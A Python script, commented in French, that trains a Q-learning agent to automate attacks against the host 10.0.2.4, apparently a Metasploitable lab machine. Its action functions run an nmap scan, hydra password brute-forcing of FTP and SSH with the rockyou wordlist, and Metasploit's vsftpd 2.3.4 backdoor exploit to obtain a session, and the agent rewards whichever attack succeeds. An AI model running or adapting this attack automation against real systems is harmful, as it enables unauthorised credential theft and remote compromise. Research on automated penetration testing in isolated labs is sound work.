import subprocess
import random
import time
import json

# Paramètres Q-learning
alpha = 0.1
gamma = 0.9
epsilon = 0.2
epsilon_decay = 0.95
min_epsilon = 0.01

# Actions possibles
actions = ["scan_ports", "bruteforce_ftp", "bruteforce_ssh", "exploit_vsftpd"]

# Initialiser Q-table
Q_table = {}

# IP cible
target_ip = "10.0.2.4"

# Timeout pour subprocess (secondes)
COMMAND_TIMEOUT = 20

# Logs
action_logs = []
all_rewards = []

# Fonctions d'actions
def scan_ports(ip):
    print("[+] Scanning ports...")
    try:
        subprocess.run(["nmap", "-sV", "-T4", ip], timeout=COMMAND_TIMEOUT)
        return True
    except subprocess.TimeoutExpired:
        print("[!] Timeout lors du scan.")
        return False
    except Exception as e:
        print(f"[!] Erreur scan_ports: {e}")
        return False

def bruteforce_ftp(ip):
    print("[+] Attempting FTP brute-force...")
    try:
        result = subprocess.run(["hydra", "-l", "anonymous", "-P", "/usr/share/wordlists/rockyou.txt", f"ftp://{ip}"],
                                capture_output=True, timeout=COMMAND_TIMEOUT)
        print(result.stdout.decode())
        return b"login:" in result.stdout
    except subprocess.TimeoutExpired:
        print("[!] Timeout FTP brute-force.")
        return False
    except Exception as e:
        print(f"[!] Erreur bruteforce_ftp: {e}")
        return False

def bruteforce_ssh(ip):
    print("[+] Attempting SSH brute-force...")
    try:
        result = subprocess.run(["hydra", "-l", "msfadmin", "-P", "/usr/share/wordlists/rockyou.txt", f"ssh://{ip}"],
                                capture_output=True, timeout=COMMAND_TIMEOUT)
        print(result.stdout.decode())
        return b"login:" in result.stdout
    except subprocess.TimeoutExpired:
        print("[!] Timeout SSH brute-force.")
        return False
    except Exception as e:
        print(f"[!] Erreur bruteforce_ssh: {e}")
        return False

def exploit_vsftpd(ip):
    print("[+] Launching VSFTPD exploit...")
    script = f"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {ip}; run; exit"
    try:
        result = subprocess.run(["msfconsole", "-q", "-x", script], capture_output=True, timeout=COMMAND_TIMEOUT)
        print(result.stdout.decode())
        return b"Session" in result.stdout
    except subprocess.TimeoutExpired:
        print("[!] Timeout exploit VSFTPD.")
        return False
    except Exception as e:
        print(f"[!] Erreur exploit_vsftpd: {e}")
        return False

# Mapping des actions
functions = {
    "scan_ports": scan_ports,
    "bruteforce_ftp": bruteforce_ftp,
    "bruteforce_ssh": bruteforce_ssh,
    "exploit_vsftpd": exploit_vsftpd,
}

# Main loop
def main():
    global Q_table
    global epsilon

    for episode in range(100):
        print(f"\n=== Episode {episode + 1} ===")
        state = "start"
        total_reward = 0

        for step in range(5):
            # Choix de l'action avec epsilon-greedy
            if random.uniform(0, 1) < epsilon:
                action = random.choice(actions)
                strategy = "exploration"
                print(f"[DECISION] Exploration -> Action choisie aléatoirement: {action}")
            else:
                state_actions = Q_table.get(state, {})
                if state_actions:
                    action = max(state_actions, key=state_actions.get)
                    strategy = "exploitation"
                    print(f"[DECISION] Exploitation -> Action avec meilleure Q-valeur: {action}")
                else:
                    action = random.choice(actions)
                    strategy = "exploration"
                    print(f"[DECISION] Aucune valeur connue pour l'état actuel, action choisie aléatoirement: {action}")

            print(f"[ACTION] {action}")

            # Exécuter l'action
            success = functions[action](target_ip)

            # Récompense
            reward = 1 if success else -1
            total_reward += reward
            print(f"[RESULT] {'Succès' if success else 'Échec'} -> Récompense: {reward}")

            # Q-Learning update
            old_value = Q_table.get(state, {}).get(action, 0)
            next_max = max(Q_table.get("next", {}).values(), default=0)
            new_value = old_value + alpha * (reward + gamma * next_max - old_value)

            print(f"[Q-LEARNING] Ancienne valeur Q: {old_value:.2f}")
            print(f"[Q-LEARNING] Valeur max suivante: {next_max:.2f}")
            print(f"[Q-LEARNING] Nouvelle valeur Q: {new_value:.2f}")

            # Mise à jour de la Q-table
            if state not in Q_table:
                Q_table[state] = {}
            Q_table[state][action] = new_value

            print(f"[Q-TABLE] État '{state}' mis à jour avec action '{action}': {Q_table[state]}")

            # Journalisation
            action_logs.append({
                "episode": episode + 1,
                "step": step + 1,
                "state": state,
                "action": action,
                "success": success,
                "reward": reward,
                "strategy": strategy,
                "epsilon": epsilon
            })

            state = "next"
            time.sleep(1)

        # Sauvegarde de la récompense totale de l'épisode
        all_rewards.append({
            "episode": episode + 1,
            "reward": total_reward,
            "epsilon": epsilon
        })

        # Réduction de epsilon
        epsilon = max(min_epsilon, epsilon * epsilon_decay)

    # Sauvegarder la Q-table
    with open("q_table.json", "w") as f:
        json.dump(Q_table, f, indent=4)

    # Sauvegarder les récompenses
    with open("rewards.json", "w") as f:
        json.dump(all_rewards, f, indent=4)

    # Sauvegarder le journal des actions
    with open("log_actions.json", "w") as f:
        json.dump(action_logs, f, indent=4)

    print("\n[+] Entraînement terminé.")
    print("[+] Q-table enregistrée dans q_table.json.")
    print("[+] Récompenses enregistrées dans rewards.json.")
    print("[+] Journal des actions enregistré dans log_actions.json.")

if __name__ == "__main__":
    main()